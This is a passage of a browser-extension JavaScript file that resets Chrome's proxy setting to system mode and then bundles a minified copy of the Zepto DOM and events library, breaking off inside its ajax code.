var needShowWarming = !1; (function() {
    chrome.proxy.settings.set({
        value: {
            mode: "system"
        },
        scope: "regular"
    },
    function() {
        console.info("- proxy system! - ")
    })
})();
var Zepto = function() {
    function d(a) {
        return null == a ? String(a) : L[S.call(a)] || "object"
    }
    function t(a) {
        return "function" == d(a)
    }
    function n(a) {
        return null != a && a == a.window
    }
    function r(a) {
        return null != a && a.nodeType == a.DOCUMENT_NODE
    }
    function w(a) {
        return "object" == d(a)
    }
    function p(a) {
        return w(a) && !n(a) && Object.getPrototypeOf(a) == Object.prototype
    }
    function m(a) {
        return "number" == typeof a.length
    }
    function u(c) {
        return a.call(c,
        function(a) {
            return null != a
        })
    }
    function v(a) {
        return a.replace(/::/g, "/").replace(/([A-Z]+)([A-Z][a-z])/g, "$1_$2").replace(/([a-z\d])([A-Z])/g, "$1_$2").replace(/_/g, "-").toLowerCase()
    }
    function C(a) {
        return a in k ? k[a] : k[a] = new RegExp("(^|\\s)" + a + "(\\s|$)")
    }
    function A(a, c) {
        return "number" != typeof c || z[v(a)] ? c: c + "px"
    }
    function b(a) {
        return "children" in a ? y.call(a.children) : q.map(a.childNodes,
        function(a) {
            if (1 == a.nodeType) return a
        })
    }
    function l(a, c, e) {
        for (B in c) e && (p(c[B]) || I(c[B])) ? (p(c[B]) && !p(a[B]) && (a[B] = {}), I(c[B]) && !I(a[B]) && (a[B] = []), l(a[B], c[B], e)) : c[B] !== E && (a[B] = c[B])
    }
    function h(a, c) {
        return null == c ? q(a) : q(a).filter(c)
    }
    function f(a, c, e, b) {
        return t(c) ? c.call(a, e, b) : c
    }
    function g(a, c) {
        var e = a.className || "",
        b = e && e.baseVal !== E;
        if (c === E) return b ? e.baseVal: e;
        b ? e.baseVal = c: a.className = c
    }
    function x(a) {
        try {
            return a ? "true" == a || ("false" == a ? !1 : "null" == a ? null: +a + "" == a ? +a: /^[\[\{]/.test(a) ? q.parseJSON(a) : a) : a
        } catch(c) {
            return a
        }
    }
    function H(a, c) {
        c(a);
        for (var e = 0,
        b = a.childNodes.length; e < b; e++) H(a.childNodes[e], c)
    }
    var E, B, q, F, G = [],
    y = G.slice,
    a = G.filter,
    c = window.document,
    e = {},
    k = {},
    z = {
        "column-count": 1,
        columns: 1,
        "font-weight": 1,
        "line-height": 1,
        opacity: 1,
        "z-index": 1,
        zoom: 1
    },
    M = /^\s*<(\w+|!)[^>]*>/,
    T = /^<(\w+)\s*\/?>(?:<\/\1>|)$/,
    U = /<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:]+)[^>]*)\/>/ig,
    O = /^(?:body|html)$/i,
    V = /([A-Z])/g,
    W = "val css html text data width height offset".split(" "),
    N = c.createElement("table"),
    P = c.createElement("tr"),
    Q = {
        tr: c.createElement("tbody"),
        tbody: N,
        thead: N,
        tfoot: N,
        td: P,
        th: P,
        "*": c.createElement("div")
    },
    X = /complete|loaded|interactive/,
    Y = /^[\w-]*$/,
    L = {},
    S = L.toString,
    D = {},
    J,
    K,
    R = c.createElement("div"),
    Z = {
        tabindex: "tabIndex",
        readonly: "readOnly",
        "for": "htmlFor",
        "class": "className",
        maxlength: "maxLength",
        cellspacing: "cellSpacing",
        cellpadding: "cellPadding",
        rowspan: "rowSpan",
        colspan: "colSpan",
        usemap: "useMap",
        frameborder: "frameBorder",
        contenteditable: "contentEditable"
    },
    I = Array.isArray ||
    function(a) {
        return a instanceof Array
    };
    D.matches = function(a, c) {
        if (!c || !a || 1 !== a.nodeType) return ! 1;
        var e = a.webkitMatchesSelector || a.mozMatchesSelector || a.oMatchesSelector || a.matchesSelector;
        if (e) return e.call(a, c);
        var b;
        b = a.parentNode; (e = !b) && (b = R).appendChild(a);
        b = ~D.qsa(b, c).indexOf(a);
        e && R.removeChild(a);
        return b
    };
    J = function(a) {
        return a.replace(/-+(.)?/g,
        function(a, c) {
            return c ? c.toUpperCase() : ""
        })
    };
    K = function(c) {
        return a.call(c,
        function(a, e) {
            return c.indexOf(a) == e
        })
    };
    D.fragment = function(a, e, b) {
        var k, z, f;
        T.test(a) && (k = q(c.createElement(RegExp.$1)));
        k || (a.replace && (a = a.replace(U, "<$1></$2>")), e === E && (e = M.test(a) && RegExp.$1), e in Q || (e = "*"), f = Q[e], f.innerHTML = "" + a, k = q.each(y.call(f.childNodes),
        function() {
            f.removeChild(this)
        }));
        p(b) && (z = q(k), q.each(b,
        function(a, c) {
            if ( - 1 < W.indexOf(a)) z[a](c);
            else z.attr(a, c)
        }));
        return k
    };
    D.Z = function(a, c) {
        a = a || [];
        a.__proto__ = q.fn;
        a.selector = c || "";
        return a
    };
    D.isZ = function(a) {
        return a instanceof D.Z
    };
    D.init = function(a, e) {
        var b;
        if (a) if ("string" == typeof a) if (a = a.trim(), "<" == a[0] && M.test(a)) b = D.fragment(a, RegExp.$1, e),
        a = null;
        else {
            if (e !== E) return q(e).find(a);
            b = D.qsa(c, a)
        } else {
            if (t(a)) return q(c).ready(a);
            if (D.isZ(a)) return a;
            if (I(a)) b = u(a);
            else if (w(a)) b = [a],
            a = null;
            else if (M.test(a)) b = D.fragment(a.trim(), RegExp.$1, e),
            a = null;
            else {
                if (e !== E) return q(e).find(a);
                b = D.qsa(c, a)
            }
        } else return D.Z();
        return D.Z(b, a)
    };
    q = function(a, c) {
        return D.init(a, c)
    };
    q.extend = function(a) {
        var c, e = y.call(arguments, 1);
        "boolean" == typeof a && (c = a, a = e.shift());
        e.forEach(function(e) {
            l(a, e, c)
        });
        return a
    };
    D.qsa = function(a, c) {
        var e, b = "#" == c[0],
        k = !b && "." == c[0],
        z = b || k ? c.slice(1) : c,
        f = Y.test(z);
        return r(a) && f && b ? (e = a.getElementById(z)) ? [e] : [] : 1 !== a.nodeType && 9 !== a.nodeType ? [] : y.call(f && !b ? k ? a.getElementsByClassName(z) : a.getElementsByTagName(c) : a.querySelectorAll(c))
    };
    q.contains = c.documentElement.contains ?
    function(a, c) {
        return a !== c && a.contains(c)
    }: function(a, c) {
        for (; c && (c = c.parentNode);) if (c === a) return ! 0;
        return ! 1
    };
    q.type = d;
    q.isFunction = t;
    q.isWindow = n;
    q.isArray = I;
    q.isPlainObject = p;
    q.isEmptyObject = function(a) {
        for (var c in a) return ! 1;
        return ! 0
    };
    q.inArray = function(a, c, e) {
        return G.indexOf.call(c, a, e)
    };
    q.camelCase = J;
    q.trim = function(a) {
        return null == a ? "": String.prototype.trim.call(a)
    };
    q.uuid = 0;
    q.support = {};
    q.expr = {};
    q.map = function(a, c) {
        var e, b = [],
        k;
        if (m(a)) for (k = 0; k < a.length; k++) e = c(a[k], k),
        null != e && b.push(e);
        else for (k in a) e = c(a[k], k),
        null != e && b.push(e);
        return 0 < b.length ? q.fn.concat.apply([], b) : b
    };
    q.each = function(a, c) {
        var e;
        if (m(a)) for (e = 0; e < a.length && !1 !== c.call(a[e], e, a[e]); e++);
        else for (e in a) if (!1 === c.call(a[e], e, a[e])) break;
        return a
    };
    q.grep = function(c, e) {
        return a.call(c, e)
    };
    window.JSON && (q.parseJSON = JSON.parse);
    q.each("Boolean Number String Function Array Date RegExp Object Error".split(" "),
    function(a, c) {
        L["[object " + c + "]"] = c.toLowerCase()
    });
    q.fn = {
        forEach: G.forEach,
        reduce: G.reduce,
        push: G.push,
        sort: G.sort,
        indexOf: G.indexOf,
        concat: G.concat,
        map: function(a) {
            return q(q.map(this,
            function(c, e) {
                return a.call(c, e, c)
            }))
        },
        slice: function() {
            return q(y.apply(this, arguments))
        },
        ready: function(a) {
            X.test(c.readyState) && c.body ? a(q) : c.addEventListener("DOMContentLoaded",
            function() {
                a(q)
            },
            !1);
            return this
        },
        get: function(a) {
            return a === E ? y.call(this) : this[0 <= a ? a: a + this.length]
        },
        toArray: function() {
            return this.get()
        },
        size: function() {
            return this.length
        },
        remove: function() {
            return this.each(function() {
                null != this.parentNode && this.parentNode.removeChild(this)
            })
        },
        each: function(a) {
            G.every.call(this,
            function(c, e) {
                return ! 1 !== a.call(c, e, c)
            });
            return this
        },
        filter: function(c) {
            return t(c) ? this.not(this.not(c)) : q(a.call(this,
            function(a) {
                return D.matches(a, c)
            }))
        },
        add: function(a, c) {
            return q(K(this.concat(q(a, c))))
        },
        is: function(a) {
            return 0 < this.length && D.matches(this[0], a)
        },
        not: function(a) {
            var c = [];
            if (t(a) && a.call !== E) this.each(function(e) {
                a.call(this, e) || c.push(this)
            });
            else {
                var e = "string" == typeof a ? this.filter(a) : m(a) && t(a.item) ? y.call(a) : q(a);
                this.forEach(function(a) {
                    0 > e.indexOf(a) && c.push(a)
                })
            }
            return q(c)
        },
        has: function(a) {
            return this.filter(function() {
                return w(a) ? q.contains(this, a) : q(this).find(a).size()
            })
        },
        eq: function(a) {
            return - 1 === a ? this.slice(a) : this.slice(a, +a + 1)
        },
        first: function() {
            var a = this[0];
            return a && !w(a) ? a: q(a)
        },
        last: function() {
            var a = this[this.length - 1];
            return a && !w(a) ? a: q(a)
        },
        find: function(a) {
            var c = this;
            return a ? "object" == typeof a ? q(a).filter(function() {
                var a = this;
                return G.some.call(c,
                function(c) {
                    return q.contains(c, a)
                })
            }) : 1 == this.length ? q(D.qsa(this[0], a)) : this.map(function() {
                return D.qsa(this, a)
            }) : q()
        },
        closest: function(a, c) {
            var e = this[0],
            b = !1;
            for ("object" == typeof a && (b = q(a)); e && !(b ? 0 <= b.indexOf(e) : D.matches(e, a));) e = e !== c && !r(e) && e.parentNode;
            return q(e)
        },
        parents: function(a) {
            for (var c = [], e = this; 0 < e.length;) e = q.map(e,
            function(a) {
                if ((a = a.parentNode) && !r(a) && 0 > c.indexOf(a)) return c.push(a),
                a
            });
            return h(c, a)
        },
        parent: function(a) {
            return h(K(this.pluck("parentNode")), a)
        },
        children: function(a) {
            return h(this.map(function() {
                return b(this)
            }), a)
        },
        contents: function() {
            return this.map(function() {
                return y.call(this.childNodes)
            })
        },
        siblings: function(c) {
            return h(this.map(function(c, e) {
                return a.call(b(e.parentNode),
                function(a) {
                    return a !== e
                })
            }), c)
        },
        empty: function() {
            return this.each(function() {
                this.innerHTML = ""
            })
        },
        pluck: function(a) {
            return q.map(this,
            function(c) {
                return c[a]
            })
        },
        show: function() {
            return this.each(function() {
                "none" == this.style.display && (this.style.display = "");
                if ("none" == getComputedStyle(this, "").getPropertyValue("display")) {
                    var a = this.style,
                    b = this.nodeName,
                    k, y;
                    e[b] || (k = c.createElement(b), c.body.appendChild(k), y = getComputedStyle(k, "").getPropertyValue("display"), k.parentNode.removeChild(k), "none" == y && (y = "block"), e[b] = y);
                    a.display = e[b]
                }
            })
        },
        replaceWith: function(a) {
            return this.before(a).remove()
        },
        wrap: function(a) {
            var c = t(a);
            if (this[0] && !c) var e = q(a).get(0),
            b = e.parentNode || 1 < this.length;
            return this.each(function(k) {
                q(this).wrapAll(c ? a.call(this, k) : b ? e.cloneNode(!0) : e)
            })
        },
        wrapAll: function(a) {
            if (this[0]) {
                q(this[0]).before(a = q(a));
                for (var c; (c = a.children()).length;) a = c.first();
                q(a).append(this)
            }
            return this
        },
        wrapInner: function(a) {
            var c = t(a);
            return this.each(function(e) {
                var b = q(this),
                k = b.contents();
                e = c ? a.call(this, e) : a;
                k.length ? k.wrapAll(e) : b.append(e)
            })
        },
        unwrap: function() {
            this.parent().each(function() {
                q(this).replaceWith(q(this).children())
            });
            return this
        },
        clone: function() {
            return this.map(function() {
                return this.cloneNode(!0)
            })
        },
        hide: function() {
            return this.css("display", "none")
        },
        toggle: function(a) {
            return this.each(function() {
                var c = q(this); (a === E ? "none" == c.css("display") : a) ? c.show() : c.hide()
            })
        },
        prev: function(a) {
            return q(this.pluck("previousElementSibling")).filter(a || "*")
        },
        next: function(a) {
            return q(this.pluck("nextElementSibling")).filter(a || "*")
        },
        html: function(a) {
            return 0 in arguments ? this.each(function(c) {
                var e = this.innerHTML;
                q(this).empty().append(f(this, a, c, e))
            }) : 0 in this ? this[0].innerHTML: null
        },
        text: function(a) {
            return 0 in arguments ? this.each(function(c) {
                c = f(this, a, c, this.textContent);
                this.textContent = null == c ? "": "" + c
            }) : 0 in this ? this[0].textContent: null
        },
        attr: function(a, c) {
            var e;
            return "string" != typeof a || 1 in arguments ? this.each(function(e) {
                if (1 === this.nodeType) if (w(a)) for (B in a) {
                    var b = B;
                    e = a[B];
                    null == e ? this.removeAttribute(b) : this.setAttribute(b, e)
                } else b = a,
                e = f(this, c, e, this.getAttribute(a)),
                null == e ? this.removeAttribute(b) : this.setAttribute(b, e)
            }) : this.length && 1 === this[0].nodeType ? !(e = this[0].getAttribute(a)) && a in this[0] ? this[0][a] : e: E
        },
        removeAttr: function(a) {
            return this.each(function() {
                1 === this.nodeType && a.split(" ").forEach(function(a) {
                    this.removeAttribute(a)
                },
                this)
            })
        },
        prop: function(a, c) {
            a = Z[a] || a;
            return 1 in arguments ? this.each(function(e) {
                this[a] = f(this, c, e, this[a])
            }) : this[0] && this[0][a]
        },
        data: function(a, c) {
            var e = "data-" + a.replace(V, "-$1").toLowerCase(),
            e = 1 in arguments ? this.attr(e, c) : this.attr(e);
            return null !== e ? x(e) : E
        },
        val: function(a) {
            return 0 in arguments ? this.each(function(c) {
                this.value = f(this, a, c, this.value)
            }) : this[0] && (this[0].multiple ? q(this[0]).find("option").filter(function() {
                return this.selected
            }).pluck("value") : this[0].value)
        },
        offset: function(a) {
            if (a) return this.each(function(c) {
                var e = q(this);
                c = f(this, a, c, e.offset());
                var b = e.offsetParent().offset();
                c = {
                    top: c.top - b.top,
                    left: c.left - b.left
                };
                "static" == e.css("position") && (c.position = "relative");
                e.css(c)
            });
            if (!this.length) return null;
            var c = this[0].getBoundingClientRect();
            return {
                left: c.left + window.pageXOffset,
                top: c.top + window.pageYOffset,
                width: Math.round(c.width),
                height: Math.round(c.height)
            }
        },
        css: function(a, c) {
            if (2 > arguments.length) {
                var e, b = this[0];
                if (!b) return;
                e = getComputedStyle(b, "");
                if ("string" == typeof a) return b.style[J(a)] || e.getPropertyValue(a);
                if (I(a)) {
                    var k = {};
                    q.each(a,
                    function(a, c) {
                        k[c] = b.style[J(c)] || e.getPropertyValue(c)
                    });
                    return k
                }
            }
            var y = "";
            if ("string" == d(a)) c || 0 === c ? y = v(a) + ":" + A(a, c) : this.each(function() {
                this.style.removeProperty(v(a))
            });
            else for (B in a) a[B] || 0 === a[B] ? y += v(B) + ":" + A(B, a[B]) + ";": this.each(function() {
                this.style.removeProperty(v(B))
            });
            return this.each(function() {
                this.style.cssText += ";" + y
            })
        },
        index: function(a) {
            return a ? this.indexOf(q(a)[0]) : this.parent().children().indexOf(this[0])
        },
        hasClass: function(a) {
            return a ? G.some.call(this,
            function(a) {
                return this.test(g(a))
            },
            C(a)) : !1
        },
        addClass: function(a) {
            return a ? this.each(function(c) {
                if ("className" in this) {
                    F = [];
                    var e = g(this);
                    f(this, a, c, e).split(/\s+/g).forEach(function(a) {
                        q(this).hasClass(a) || F.push(a)
                    },
                    this);
                    F.length && g(this, e + (e ? " ": "") + F.join(" "))
                }
            }) : this
        },
        removeClass: function(a) {
            return this.each(function(c) {
                if ("className" in this) {
                    if (a === E) return g(this, "");
                    F = g(this);
                    f(this, a, c, F).split(/\s+/g).forEach(function(a) {
                        F = F.replace(C(a), " ")
                    });
                    g(this, F.trim())
                }
            })
        },
        toggleClass: function(a, c) {
            return a ? this.each(function(e) {
                var b = q(this);
                f(this, a, e, g(this)).split(/\s+/g).forEach(function(a) { (c === E ? !b.hasClass(a) : c) ? b.addClass(a) : b.removeClass(a)
                })
            }) : this
        },
        scrollTop: function(a) {
            if (this.length) {
                var c = "scrollTop" in this[0];
                return a === E ? c ? this[0].scrollTop: this[0].pageYOffset: this.each(c ?
                function() {
                    this.scrollTop = a
                }: function() {
                    this.scrollTo(this.scrollX, a)
                })
            }
        },
        scrollLeft: function(a) {
            if (this.length) {
                var c = "scrollLeft" in this[0];
                return a === E ? c ? this[0].scrollLeft: this[0].pageXOffset: this.each(c ?
                function() {
                    this.scrollLeft = a
                }: function() {
                    this.scrollTo(a, this.scrollY)
                })
            }
        },
        position: function() {
            if (this.length) {
                var a = this[0],
                c = this.offsetParent(),
                e = this.offset(),
                b = O.test(c[0].nodeName) ? {
                    top: 0,
                    left: 0
                }: c.offset();
                e.top -= parseFloat(q(a).css("margin-top")) || 0;
                e.left -= parseFloat(q(a).css("margin-left")) || 0;
                b.top += parseFloat(q(c[0]).css("border-top-width")) || 0;
                b.left += parseFloat(q(c[0]).css("border-left-width")) || 0;
                return {
                    top: e.top - b.top,
                    left: e.left - b.left
                }
            }
        },
        offsetParent: function() {
            return this.map(function() {
                for (var a = this.offsetParent || c.body; a && !O.test(a.nodeName) && "static" == q(a).css("position");) a = a.offsetParent;
                return a
            })
        }
    };
    q.fn.detach = q.fn.remove; ["width", "height"].forEach(function(a) {
        var c = a.replace(/./,
        function(a) {
            return a[0].toUpperCase()
        });
        q.fn[a] = function(e) {
            var b, k = this[0];
            return e === E ? n(k) ? k["inner" + c] : r(k) ? k.documentElement["scroll" + c] : (b = this.offset()) && b[a] : this.each(function(c) {
                k = q(this);
                k.css(a, f(this, e, c, k[a]()))
            })
        }
    }); ["after", "prepend", "before", "append"].forEach(function(a, e) {
        var b = e % 2;
        q.fn[a] = function() {
            var a, k = q.map(arguments,
            function(c) {
                a = d(c);
                return "object" == a || "array" == a || null == c ? c: D.fragment(c)
            }),
            y,
            z = 1 < this.length;
            return 1 > k.length ? this: this.each(function(a, f) {
                y = b ? f: f.parentNode;
                f = 0 == e ? f.nextSibling: 1 == e ? f.firstChild: 2 == e ? f: null;
                var g = q.contains(c.documentElement, y);
                k.forEach(function(a) {
                    if (z) a = a.cloneNode(!0);
                    else if (!y) return q(a).remove();
                    y.insertBefore(a, f);
                    g && H(a,
                    function(a) {
                        null == a.nodeName || "SCRIPT" !== a.nodeName.toUpperCase() || a.type && "text/javascript" !== a.type || a.src || window.eval.call(window, a.innerHTML)
                    })
                })
            })
        };
        q.fn[b ? a + "To": "insert" + (e ? "Before": "After")] = function(c) {
            q(c)[a](this);
            return this
        }
    });
    D.Z.prototype = q.fn;
    D.uniq = K;
    D.deserializeValue = x;
    q.zepto = D;
    return q
} ();
window.Zepto = Zepto;
void 0 === window.$ && (window.$ = Zepto); (function(d) {
    function t(b) {
        return b._zid || (b._zid = C++)
    }
    function n(b, a, c, e) {
        a = r(a);
        if (a.ns) var k = new RegExp("(?:^| )" + a.ns.replace(" ", " .* ?") + "(?: |$)");
        return (f[t(b)] || []).filter(function(b) {
            return b && (!a.e || b.e == a.e) && (!a.ns || k.test(b.ns)) && (!c || t(b.fn) === t(c)) && (!e || b.sel == e)
        })
    }
    function r(b) {
        b = ("" + b).split(".");
        return {
            e: b[0],
            ns: b.slice(1).sort().join(" ")
        }
    }
    function w(b) {
        return E[b] || x && H[b] || b
    }
    function p(b, a, c, e, k, z, g) {
        var h = t(b),
        l = f[h] || (f[h] = []);
        a.split(/\s/).forEach(function(a) {
            if ("ready" == a) return d(document).ready(c);
            var f = r(a);
            f.fn = c;
            f.sel = k;
            f.e in E && (c = function(a) {
                var c = a.relatedTarget;
                if (!c || c !== this && !d.contains(this, c)) return f.fn.apply(this, arguments)
            });
            var h = (f.del = z) || c;
            f.proxy = function(a) {
                a = u(a);
                if (!a.isImmediatePropagationStopped()) {
                    a.data = e;
                    var c = h.apply(b, a._args == A ? [a] : [a].concat(a._args)); ! 1 === c && (a.preventDefault(), a.stopPropagation());
                    return c
                }
            };
            f.i = l.length;
            l.push(f);
            "addEventListener" in b && b.addEventListener(w(f.e), f.proxy, f.del && !x && f.e in H || !!g)
        })
    }
    function m(b, a, c, e, k) {
        var z = t(b); (a || "").split(/\s/).forEach(function(a) {
            n(b, a, c, e).forEach(function(a) {
                delete f[z][a.i];
                "removeEventListener" in b && b.removeEventListener(w(a.e), a.proxy, a.del && !x && a.e in H || !!k)
            })
        })
    }
    function u(b, a) {
        if (a || !b.isDefaultPrevented) if (a || (a = b), d.each(G,
        function(c, e) {
            var k = a[c];
            b[c] = function() {
                this[e] = B;
                return k && k.apply(a, arguments)
            };
            b[e] = q
        }), a.defaultPrevented !== A ? a.defaultPrevented: "returnValue" in a ? !1 === a.returnValue: a.getPreventDefault && a.getPreventDefault()) b.isDefaultPrevented = B;
        return b
    }
    function v(b) {
        var a, c = {
            originalEvent: b
        };
        for (a in b) F.test(a) || b[a] === A || (c[a] = b[a]);
        return u(c, b)
    }
    var C = 1,
    A, b = Array.prototype.slice,
    l = d.isFunction,
    h = function(b) {
        return "string" == typeof b
    },
    f = {},
    g = {},
    x = "onfocusin" in window,
    H = {
        focus: "focusin",
        blur: "focusout"
    },
    E = {
        mouseenter: "mouseover",
        mouseleave: "mouseout"
    };
    g.click = g.mousedown = g.mouseup = g.mousemove = "MouseEvents";
    d.event = {
        add: p,
        remove: m
    };
    d.proxy = function(y, a) {
        var c = 2 in arguments && b.call(arguments, 2);
        if (l(y)) {
            var e = function() {
                return y.apply(a, c ? c.concat(b.call(arguments)) : arguments)
            };
            e._zid = t(y);
            return e
        }
        if (h(a)) return c ? (c.unshift(y[a], y), d.proxy.apply(null, c)) : d.proxy(y[a], y);
        throw new TypeError("expected function");
    };
    d.fn.bind = function(b, a, c) {
        return this.on(b, a, c)
    };
    d.fn.unbind = function(b, a) {
        return this.off(b, a)
    };
    d.fn.one = function(b, a, c, e) {
        return this.on(b, a, c, e, 1)
    };
    var B = function() {
        return ! 0
    },
    q = function() {
        return ! 1
    },
    F = /^([A-Z]|returnValue$|layer[XY]$)/,
    G = {
        preventDefault: "isDefaultPrevented",
        stopImmediatePropagation: "isImmediatePropagationStopped",
        stopPropagation: "isPropagationStopped"
    };
    d.fn.delegate = function(b, a, c) {
        return this.on(a, b, c)
    };
    d.fn.undelegate = function(b, a, c) {
        return this.off(a, b, c)
    };
    d.fn.live = function(b, a) {
        d(document.body).delegate(this.selector, b, a);
        return this
    };
    d.fn.die = function(b, a) {
        d(document.body).undelegate(this.selector, b, a);
        return this
    };
    d.fn.on = function(y, a, c, e, k) {
        var z, f, g = this;
        if (y && !h(y)) return d.each(y,
        function(e, b) {
            g.on(e, a, c, b, k)
        }),
        g;
        h(a) || l(e) || !1 === e || (e = c, c = a, a = A);
        if (l(c) || !1 === c) e = c,
        c = A; ! 1 === e && (e = q);
        return g.each(function(g, h) {
            k && (z = function(a) {
                m(h, a.type, e);
                return e.apply(this, arguments)
            });
            a && (f = function(c) {
                var k, y = d(c.target).closest(a, h).get(0);
                if (y && y !== h) return k = d.extend(v(c), {
                    currentTarget: y,
                    liveFired: h
                }),
                (z || e).apply(y, [k].concat(b.call(arguments, 1)))
            });
            p(h, y, e, c, a, f || z)
        })
    };
    d.fn.off = function(b, a, c) {
        var e = this;
        if (b && !h(b)) return d.each(b,
        function(c, b) {
            e.off(c, a, b)
        }),
        e;
        h(a) || l(c) || !1 === c || (c = a, a = A); ! 1 === c && (c = q);
        return e.each(function() {
            m(this, b, c, a)
        })
    };
    d.fn.trigger = function(b, a) {
        b = h(b) || d.isPlainObject(b) ? d.Event(b) : u(b);
        b._args = a;
        return this.each(function() {
            if (b.type in H && "function" == typeof this[b.type]) this[b.type]();
            else "dispatchEvent" in this ? this.dispatchEvent(b) : d(this).triggerHandler(b, a)
        })
    };
    d.fn.triggerHandler = function(b, a) {
        var c, e;
        this.each(function(k, z) {
            c = v(h(b) ? d.Event(b) : b);
            c._args = a;
            c.target = z;
            d.each(n(z, b.type || b),
            function(a, b) {
                e = b.proxy(c);
                if (c.isImmediatePropagationStopped()) return ! 1
            })
        });
        return e
    };
    "focusin focusout focus blur load resize scroll unload click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select keydown keypress keyup error".split(" ").forEach(function(b) {
        d.fn[b] = function(a) {
            return 0 in arguments ? this.bind(b, a) : this.trigger(b)
        }
    });
    d.Event = function(b, a) {
        h(b) || (a = b, b = a.type);
        var c = document.createEvent(g[b] || "Events"),
        e = !0;
        if (a) for (var k in a)"bubbles" == k ? e = !!a[k] : c[k] = a[k];
        c.initEvent(b, e, !0);
        return u(c)
    }
})(Zepto); (function(d) {
    function t(b, a, c, e) {
        if (b.global) return b = a || f,
        c = d.Event(c),
        d(b).trigger(c, e),
        !c.isDefaultPrevented()
    }
    function n(b) {
        b.global && 0 === d.active++&&t(b, null, "ajaxStart")
    }
    function r(b, a) {
        var c = a.context;
        if (!1 === a.beforeSend.call(c, b, a) || !1 === t(a, c, "ajaxBeforeSend", [b, a])) return ! 1;
        t(a, c, "ajaxSend", [b, a])
    }
    function w(b, a, c, e) {
        var k = c.context;
        c.success.call(k, b, "success", a);
        e && e.resolveWith(k, [b, "success", a]);
        t(c, k, "ajaxSuccess", [a, c, b]);
        m("success", a, c)
    }
    function p(b, a, c, e, k) {
        var z = e.context;
        e.error.call(z, c, a, b);
        k && k.rejectWith(z, [c, a, b]);
        t(e, z, "ajaxError", [c, e, b || a]);
        m(a, c, e)
    }
    function m(b, a, c) {
        var e = c.context;
        c.complete.call(e, a, b);
        t(c, e, "ajaxComplete", [a, c]);
        c.global && !--d.active && t(c, null, "ajaxStop")
    }
    function u() {}
    function v(b) {
        b && (b = b.split(";", 2)[0]);
        return b && ("text/html" == b ? "html": "application/json" == b ? "json": E.test(b) ? "script": B.test(b) && "xml") || "text"
    }
    function C(b, a) {
        return "" == a ? b: (b + "&" + a).replace(/[&?]{1,2}/, "?")
    }
    function A(b) {
        b.processData && b.data && "string" != d.type(b.data) && (b.data = d.param(b.data, b.traditional)); ! b.data || b.type && "GET" != b.type.toUpperCase() || (b.url = C(b.url, b.data), b.data = void 0)
    }
    function b(b, a, c, e) {
        d.isFunction(a) && (e = c, c = a, a = void 0);
        d.isFunction(c) || (e = c, c = void 0);
        return {
            url: b,
            data: a,
            success: c,
            dataType: e
        }
    }
    function l(b, a, c, e) {
        var k, z = d.isArray(a),
        f = d.isPlainObject(a);
        d.each(a,
        function(a, g) {
            k = d.type(g);
            e && (a = c ? e: e + "[" + (f || "object" == k || "array" == k ? a: "") + "]"); ! e && z ? b.add(g.name, g.value) : "array" == k || !c && "object" == k ? l(b, g, c, a) : b.add(a, g)
        })
    }
    var h = 0,
    f = window.document,
    g, x, H = /<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi,
    E = /^(?:text|application)\/javascript/i,
    B = /^(?:text|application)\/xml/i,
    q = /^\s*$/,
    F = f.createElement("a");
    F.href = window.location.href;
    d.active = 0;
    d.ajaxJSONP = function(b, a) {
        if (! ("type" in b)) return d.ajax(b);
        var c = b.jsonpCallback,
        e = (d.isFunction(c) ? c() : c) || "jsonp" + ++h,
        k = f.createElement("script"),
        z = window[e],
        g,
        l = function(a) {
            d(k).triggerHandler("error", a || "abort")
        },
        x = {
            abort: l
        },
        m;
        a && a.promise(x);
        d(k).on("load error",
        function(c, f) {
            clearTimeout(m);
            d(k).off().remove();
            "error" != c.type && g ? w(g[0], x, b, a) : p(null, f || "error", x, b, a);
            window[e] = z;
            g && d.isFunction(z) && z(g[0]);
            z = g = void 0
        });
        if (!1 === r(x, b)) return l("abort"),
        x;
        window[e] = function() {
            g = arguments
        };
        k.src = b.url.replace(/\?(.+)=\?/, "?$1=" + e);
        f.head.appendChild(k);
        0 < b.timeout && (m = setTimeout(function() {
            l("timeout")
        },
        b.timeout));
        return x
    };
    d.ajaxSettings = {
        type: "GET",
        beforeSend: u,
        success: u,
        error: u,
        complete: u,
        context: null,
        global: !0,
        xhr: function() {
            return new window.XMLHttpRequest
        },
        accepts: {
            script: "text/javascript, application/javascript, application/x-javascript",
            json: "application/json",
            xml: "application/xml, text/xml",
            html: "text/html",
            text: "text/plain"
        },
        crossDomain: !1,
        timeout: 0,
        processData: !0,
        cache: !0
    };
    d.ajax = function(b) {
        var a = d.extend({},
        b || {}),
        c = d.Deferred && d.Deferred(),
        e;
        for (g in d.ajaxSettings) void 0 === a[g] && (a[g] = d.ajaxSettings[g]);
        n(a);
        a.crossDomain || (e = f.createElement("a"), e.href = a.url, e.href = e.href, a.crossDomain = F.protocol + "//" + F.host !== e.protocol + "//" + e.host);
        a.url || (a.url = window.location.toString());
        A(a);
        var k = a.dataType; (e = /\?.+=\?/.test(a.url)) && (k = "jsonp"); ! 1 !== a.cache && (b && !0 === b.cache || "script" != k && "jsonp" != k) || (a.url = C(a.url, "_=" + Date.now()));
        if ("jsonp" == k) return e || (a.url = C(a.url, a.jsonp ? a.jsonp + "=?": !1 === a.jsonp ? "": "callback=?")),
        d.ajaxJSONP(a, c);
        b = a.accepts[k];
        var z = {};
        e = function(a, c) {
            z[a.toLowerCase()] = [a, c]
        };
        var h = /^([\w-]+:)\/\//.test(a.url) ? RegExp.$1: window.location.protocol,
        l = a.xhr(),
        m = l.setRequestHeader,
        t;
        c && c.promise(l);
        a.crossDomain || e("X-Requested-With", "XMLHttpRequest");
        e("Accept", b || "*/*");
        if (b = a.mimeType || b) - 1 < b.indexOf(",") && (b = b.split(",", 2)[0]),
        l.overrideMimeType && l.overrideMimeType(b); (a.contentType || !1 !== a.contentType && a.data && "GET" != a.type.toUpperCase()) && e("Content-Type", a.contentType || "application/x-www-form-urlencoded");
        if (a.headers) for (x in a.headers) e(x, a.headers[x]);
        l.setRequestHeader = e;
        l.onreadystatechange = function() {
            if (4 == l.readyState) {
                l.onreadystatechange = u;
                clearTimeout(t);
                var b, e = !1;
                if (200 <= l.status && 300 > l.status || 304 == l.status || 0 == l.status && "file:" == h) {
                    k = k || v(a.mimeType || l.getResponseHeader("content-type"));
                    b = l.responseText;
                    try {
                        "script" == k ? (0, eval)(b) : "xml" == k ? b = l.responseXML: "json" == k && (b = q.test(b) ? null: d.parseJSON(b))
                    } catch(z) {
                        e = z
                    }
